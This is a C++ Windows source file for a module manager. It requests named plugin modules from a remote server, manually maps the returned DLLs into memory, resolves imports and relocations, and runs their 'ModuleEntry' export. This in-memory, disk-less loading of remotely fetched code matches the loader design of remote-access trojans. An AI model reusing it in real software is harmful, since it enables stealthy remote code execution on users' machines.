#include "ModuleMgr.h"
#include <process.h>
CModuleMgr::CModuleMgr(CKernel*pKernel)
{
	ZeroMemory(m_Modules,sizeof(Module) * MAX_MODULE_COUNT);
	//初始,TRUE
	m_hFree = CreateEvent(NULL, FALSE, TRUE, NULL);
	//自动
	m_hModuleTrans = CreateEvent(NULL, FALSE, FALSE, 0);

	m_pCurModule = NULL;

	m_pKernel = pKernel;
}


CModuleMgr::~CModuleMgr()
{
	if (m_hFree){
		CloseHandle(m_hFree);
		m_hFree = NULL;
	}
	if (m_hModuleTrans){
		CloseHandle(m_hModuleTrans);
		m_hModuleTrans = NULL;
	}
}

BOOL CModuleMgr::ModuleLoaded(const char*name){
	for (int i = 0; i < MAX_MODULE_COUNT; i++){
		if (!lstrcmpiA(name, m_Modules[i].szName)){
			return TRUE;
		}
	}
	return FALSE;
}

BOOL CModuleMgr::IsBusy(){
	DWORD dwStatu = WaitForSingleObject(m_hFree, 0);
	return (dwStatu != WAIT_OBJECT_0);
}

#include <stdio.h>

BOOL CModuleMgr::RunModule(const char*name, const char*ServerAddr, UINT uPort, LPVOID lpParam){
	if (!ModuleLoaded(name)){
		if (IsBusy()){
			return FALSE;
		}
	}

	RunCtx*pRunCtx = new RunCtx;

	pRunCtx->pMgr = this;
	pRunCtx->lpParam = lpParam;
	pRunCtx->uPort = uPort;

	lstrcpyA(pRunCtx->szName, name);
	lstrcpyA(pRunCtx->szServerAddr, ServerAddr);

	typedef unsigned int(__stdcall *typeThreadProc)(void*);
	HANDLE hThread = (HANDLE)_beginthreadex(0, 0, (typeThreadProc)ThreadProc,pRunCtx, 0, 0);

	if (hThread){
		CloseHandle(hThread);
	}
	return TRUE;
}

void  __stdcall CModuleMgr::ThreadProc(RunCtx*pRunCtx){
	//
	typedef void (*ModuleEntry)(char* szServerAddr, unsigned short uPort, LPVOID lpParam);
	
	int i;
	for (i = 0; i < MAX_MODULE_COUNT; i++){
		if (!lstrcmpA(pRunCtx->szName, pRunCtx->pMgr->m_Modules[i].szName)){
			break;
		}
	}

	if (i == MAX_MODULE_COUNT){
		//Not found;
		for (i = 0; i < MAX_MODULE_COUNT; i++){
			if (!lstrcmpA("", pRunCtx->pMgr->m_Modules[i].szName)){
				break;
			}
		}
		if (i < MAX_MODULE_COUNT){
			pRunCtx->pMgr->m_pCurModule = pRunCtx->szName;
			pRunCtx->pMgr->GetModule(pRunCtx->szName);
			pRunCtx->pMgr->WaitTransFinished();
	//
			for (i = 0; i < MAX_MODULE_COUNT; i++){
				if (!lstrcmpA(pRunCtx->szName, pRunCtx->pMgr->m_Modules[i].szName)){
					break;
				}
			}
		}
	}

	if (i < MAX_MODULE_COUNT && pRunCtx->pMgr->m_Modules[i].lpEntry){
		ModuleEntry entry = (ModuleEntry)pRunCtx->pMgr->m_Modules[i].lpEntry;
		//Run Module;
		entry(pRunCtx->szServerAddr, pRunCtx->uPort,(LPVOID)(((DWORD)pRunCtx->lpParam)&0x7fffffff));
	}


	//clean resource,the heighest bit is the flag of auto free.
	if (((DWORD)(pRunCtx->lpParam)) & 0x80000000){
		free((LPVOID)(((DWORD)pRunCtx->lpParam) & 0x7fffffff));
		pRunCtx->lpParam = NULL;
	}
	delete pRunCtx;
	printf("CModuleMgr::ThreadProc return\n");
	_endthreadex(0);
}

void CModuleMgr::GetModule(const char*name){
	m_pKernel->Send(KNEL_GETMODULE, name, lstrlenA(name) + 1);
}

void CModuleMgr::WaitTransFinished(){
	WaitForSingleObject(m_hModuleTrans, INFINITE);
}


void CModuleMgr::LoadModule(const char*buff,int size){
	//Load Module From Mem
	LPVOID lpImageBase = NULL;
	LPVOID lpEntry = NULL;
	if (size > 0){
		//
		if (0 == LoadFromMem(buff, &lpImageBase, &lpEntry)){
			for (int i = 0; i < MAX_MODULE_COUNT; i++){
				if (!lstrcmpA(m_Modules[i].szName, "")){
					lstrcpyA(m_Modules[i].szName, m_pCurModule);
					m_Modules[i].lpImageBase = lpImageBase;
					m_Modules[i].lpEntry = lpEntry;
					break;
				}
			}
		}
	}
	else{
		//Load Module Filed(Maybe not found module);
		
	}
	//
	m_pCurModule = NULL;
	SetEvent(m_hModuleTrans);
	SetEvent(m_hFree);
}

LPVOID CModuleMgr::MyGetProcAddress(HMODULE hModule, const char*ProcName){
	IMAGE_DOS_HEADER *pDosHeader = (IMAGE_DOS_HEADER*)(hModule);
	IMAGE_NT_HEADERS *pNtHeaders = (IMAGE_NT_HEADERS*)(pDosHeader->e_lfanew + (DWORD)hModule);

	IMAGE_EXPORT_DIRECTORY*pExportDirectory = (IMAGE_EXPORT_DIRECTORY*)(pNtHeaders->
		OptionalHeader.DataDirectory[0].VirtualAddress + (DWORD)hModule);

	DWORD dwRavOfExportBegin = pNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress;
	DWORD dwRvaOfExportEnd = dwRavOfExportBegin + pNtHeaders->OptionalHeader.DataDirectory[0].Size;

	DWORD* FuncTable = (DWORD*)((DWORD)hModule + pExportDirectory->AddressOfFunctions);
	DWORD dwRvaOfFunc = 0;

	//there is no export table;
	if (dwRvaOfExportEnd == dwRavOfExportBegin){
		return NULL;
	}
	if (0 == (0xffff0000 & (DWORD)ProcName)){
		//by ordinary
		WORD ord = (WORD)ProcName;
		DWORD dwIndex = ord - pExportDirectory->Base;

		if (dwIndex >= pExportDirectory->NumberOfFunctions){
			return 0;
		}
		dwRvaOfFunc = FuncTable[dwIndex];
	}
	else{
		//by name
		DWORD * NameTable = (DWORD*)((DWORD)hModule + pExportDirectory->AddressOfNames);
		WORD *	OrdTable = (WORD*)((DWORD)hModule + pExportDirectory->AddressOfNameOrdinals);

		for (int i = 0; i < pExportDirectory->NumberOfNames; i++){
			char*name = (char*)(NameTable[i] + (DWORD)hModule);
			if (!lstrcmpiA(name, ProcName)){
				dwRvaOfFunc = FuncTable[OrdTable[i]];
				break;
			}
		}
	}
	//导出表重定向
	if (dwRvaOfFunc>dwRavOfExportBegin && dwRvaOfFunc < dwRvaOfExportEnd){
		char szBuffer[0x100];
		char*pModule = szBuffer;
		char*pProc = pModule;
		lstrcpynA(szBuffer, (char*)(dwRvaOfFunc + (DWORD)hModule), 0x100);

		while (pProc[0] && pProc[0] != '.'){
			pProc++;
		}
		*pProc++ = 0;
		if ((hModule = GetModuleHandleA(pModule)) == NULL){
			hModule = LoadLibraryA(pModule);
		}
		if (hModule == NULL){
			return 0;
		}
		return MyGetProcAddress(hModule, pProc);
	}
	return (void*)(dwRvaOfFunc + (DWORD)hModule);
}

int CModuleMgr::LoadFromMem(const char*image, LPVOID *lppImageBase, LPVOID *lppEntry){

	//绝对地址需要重定位,所以DosHeader 和 FileHeader 里面的都是相对地址
	IMAGE_DOS_HEADER *pDosHeader = (IMAGE_DOS_HEADER*)image;
	IMAGE_NT_HEADERS *pNtHeaders;
	IMAGE_SECTION_HEADER*pSectionHeader;
	IMAGE_BASE_RELOCATION*pBaseRelocation;
	IMAGE_IMPORT_DESCRIPTOR*pImportDescriptor;

	DWORD dwDelta;
	DWORD dwImageSize;
	CHAR* ImageBase;
	DWORD dwOriginalBase;
	DWORD dwOff;

	if (pDosHeader->e_magic != 0x5a4d){
		return -1;
	}
	dwOff = pDosHeader->e_lfanew;
	pNtHeaders = (IMAGE_NT_HEADERS*)(image + dwOff);

	if (pNtHeaders->Signature != 0x4550){
		return -2;
	}

	dwImageSize = pNtHeaders->OptionalHeader.SizeOfImage;
	dwOriginalBase = pNtHeaders->OptionalHeader.ImageBase;

	ImageBase = (char*)VirtualAlloc((LPVOID)dwOriginalBase, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (ImageBase == NULL){
		ImageBase = (char*)VirtualAlloc(NULL, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (ImageBase == NULL){
			return -3;
		}
	}
	//copy Headers (Dos Stub + PE Header + Section Headers)
	RtlCopyMemory(ImageBase, image, dwOff + pNtHeaders->OptionalHeader.SizeOfHeaders);
	//reset pNtHeaders
	pNtHeaders = (IMAGE_NT_HEADERS*)(ImageBase + dwOff);
	pNtHeaders->OptionalHeader.ImageBase = (DWORD)ImageBase;

	pSectionHeader = (IMAGE_SECTION_HEADER*)(ImageBase + dwOff + sizeof(DWORD)
		+ sizeof(IMAGE_FILE_HEADER) + pNtHeaders->FileHeader.SizeOfOptionalHeader);
	//
	//展开section,空间已经分配好了,只需要把相应位置的数据copy即可
	for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++){
		if (pSectionHeader[i].SizeOfRawData > 0){
			//SizeOfRawData == 0, bss
			RtlCopyMemory(ImageBase + pSectionHeader[i].VirtualAddress,
				image + pSectionHeader[i].PointerToRawData, pSectionHeader[i].SizeOfRawData);
		}
	}
	//修复IAT
	//IMAGE_IMPORT_DESCRIPTOR 保存了dll name和从该dll导入哪些函数
	pImportDescriptor = (IMAGE_IMPORT_DESCRIPTOR*)(ImageBase +
		pNtHeaders->OptionalHeader.DataDirectory[1].VirtualAddress);

	for (; pImportDescriptor->Characteristics; pImportDescriptor++){
		//Load Library;
		char*szModuleName = (char*)ImageBase + pImportDescriptor->Name;
		HMODULE hModule = GetModuleHandleA(szModuleName);

		if (hModule == NULL){
			hModule = LoadLibraryA((char*)ImageBase + pImportDescriptor->Name);
			if (hModule == NULL)
				return -4;
		}
		//INT 用于dll 绑定 ,修复IAT即可.
		PIMAGE_THUNK_DATA pThunkData = (PIMAGE_THUNK_DATA)(ImageBase + pImportDescriptor->FirstThunk);
		for (; pThunkData->u1.ForwarderString; pThunkData++){
			DWORD dwFuncAddress = NULL;
			//最高位区分序号导入还是名字导入
			if (pThunkData->u1.Ordinal & 0x80000000){
				//序号导入.
				dwFuncAddress = (DWORD)MyGetProcAddress(hModule, (char*)(pThunkData->u1.Ordinal & 0xffff));
			}
			else{
				//Import By Name
				IMAGE_IMPORT_BY_NAME*pName = (IMAGE_IMPORT_BY_NAME*)(pThunkData->u1.ForwarderString + ImageBase);
				//pName->Hint;							//??? Hint 
				dwFuncAddress = (DWORD)MyGetProcAddress(hModule, (char*)pName->Name);
			}

			if (dwFuncAddress == NULL){
				return -5;
			}
			pThunkData->u1.Function = dwFuncAddress;
		}
	}
	//重定位修复

	pBaseRelocation = (IMAGE_BASE_RELOCATION*)(ImageBase +
		pNtHeaders->OptionalHeader.DataDirectory[5].VirtualAddress);

	dwDelta = (DWORD)ImageBase - dwOriginalBase;

	while (pBaseRelocation->VirtualAddress || pBaseRelocation->SizeOfBlock){
		DWORD dwItems = (pBaseRelocation->SizeOfBlock - 8) / 2;
		WORD * pAddrs = (WORD*)(8 + (DWORD)pBaseRelocation);
		for (int i = 0; i < dwItems; i++){
			WORD dwType = (pAddrs[i] >> 12);
			WORD dwOff = (pAddrs[i] & 0xfff);
			DWORD*pRelocationAddr = (DWORD*)(ImageBase + pBaseRelocation->VirtualAddress + dwOff);
			//
			switch (dwType)
			{
			case IMAGE_REL_BASED_ABSOLUTE:		//block alignment
				break;
			case IMAGE_REL_BASED_HIGHLOW:
				*pRelocationAddr += dwDelta;
				break;
			default:
				return -6;
			}
		}
		//Next Block
		pBaseRelocation = (IMAGE_BASE_RELOCATION*)(pBaseRelocation->SizeOfBlock + (DWORD)pBaseRelocation);
	}
	//tls......

	//set section property
	for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++){
		DWORD dwProtect = 0;
		DWORD dwOldProtect = 0;
		DWORD dwCharacter = pSectionHeader[i].Characteristics;

		if (dwCharacter & IMAGE_SCN_MEM_EXECUTE){
			if (dwCharacter & IMAGE_SCN_MEM_WRITE){
				dwProtect = PAGE_EXECUTE_READWRITE;
			}
			else{
				dwProtect = PAGE_EXECUTE_READ;
			}
		}
		else{
			if (dwCharacter & IMAGE_SCN_MEM_READ){
				if (dwCharacter&IMAGE_SCN_MEM_WRITE){
					dwProtect = PAGE_READWRITE;
				}
				else{
					dwProtect = PAGE_READONLY;
				}
			}
		}
		//get section size
		DWORD dwSectionSize = 0;
		if ((i + 1) == pNtHeaders->FileHeader.NumberOfSections){
			dwSectionSize = pNtHeaders->OptionalHeader.SizeOfImage - pSectionHeader[i].VirtualAddress;
		}
		else{
			dwSectionSize = pSectionHeader[i + 1].VirtualAddress - pSectionHeader[i].VirtualAddress;
		}
		//
		if (!VirtualProtect(ImageBase + pSectionHeader[i].VirtualAddress,
			dwSectionSize, dwProtect, &dwOldProtect)){
			return -7;
		}
		pSectionHeader[i].Misc.PhysicalAddress = (DWORD)(ImageBase + pSectionHeader[i].VirtualAddress);
	}
	//Run.
	typedef BOOL(WINAPI *DllEntryProc)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);
	DllEntryProc entry = (DllEntryProc)(pNtHeaders->OptionalHeader.ImageBase +
		pNtHeaders->OptionalHeader.AddressOfEntryPoint);
	//call dll main,init cruntime
	if (entry){
		entry((HINSTANCE)ImageBase, DLL_PROCESS_ATTACH, 0);
	}
	//Find Entry
	*lppImageBase = ImageBase;
	*lppEntry = MyGetProcAddress((HINSTANCE)ImageBase, "ModuleEntry");
	return 0;
}
